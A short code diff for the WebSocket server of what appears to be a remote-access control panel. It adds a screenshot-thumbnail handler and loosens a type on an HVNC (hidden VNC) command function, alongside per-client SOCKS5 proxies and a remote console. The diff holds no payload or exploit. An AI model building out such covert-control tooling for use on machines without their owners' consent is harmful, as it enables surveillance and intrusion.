@@ -17,7 +17,7 @@ import { decodeMessage, encodeMessage, type WireMessage, type Hello, type Ping }
 import * as sessionManager from "../../sessions/sessionManager";
 import type { SocketData } from "../../sessions/types";
 import type { ClientInfo } from "../../types";
-import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong } from "../../wsHandlers";
+import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong, handleScreenshotThumbnailResult } from "../../wsHandlers";
 import { queueClientDbUpdate, scheduleQueuedClientDbFlush } from "../../client-db-sync";
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
 import { stopAllProxiesForClient } from "../socks5-proxy-manager";
@@ -251,7 +251,7 @@ type WsLifecycleDeps = {
   cleanupDesktopAudioViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
-  sendHVNCCommand: (target: ClientInfo, commandType: string, payload: Record<string, unknown>) => void;
+  sendHVNCCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
   notifyConsoleClosed: (clientId: string, reason: string) => void;
   clearPendingNotificationScreenshots: (clientId: string) => void;
   clearClientPluginState: (clientId: string) => void;
@@ -790,6 +790,7 @@ export async function handleWebSocketMessage(
         }
         break;
       case "screenshot_result":
+        handleScreenshotThumbnailResult(client, payload);
         deps.handleNotificationScreenshotResult(client.id, payload);
         break;
       case "console_output":
